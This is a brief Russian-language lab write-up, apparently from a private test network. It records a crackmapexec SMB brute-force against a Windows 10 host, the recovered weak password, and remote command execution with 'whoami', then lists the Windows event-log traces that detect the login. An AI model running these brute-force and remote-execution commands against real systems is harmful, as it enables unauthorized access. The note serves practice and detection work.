# 🎯 Windows 10 — SMB Brute Force

**Дата:** 06.10.2026
**Цель:** 192.168.56.30 (Windows 10)
**Оперативник:** Cor Vex

## Атака
- `crackmapexec smb 192.168.56.30 -u Admin-win-10 -p /tmp/top1k.txt`
- Пароль: `admin`
- RCE: `crackmapexec ... -x "whoami"`

## Детект
- Event Viewer → 4624 (успешный вход)
- Logon Type 3 (Network)
- Source IP: 192.168.56.107

## Вывод
- Слабый пароль `admin` + открытый SMB = полный контроль.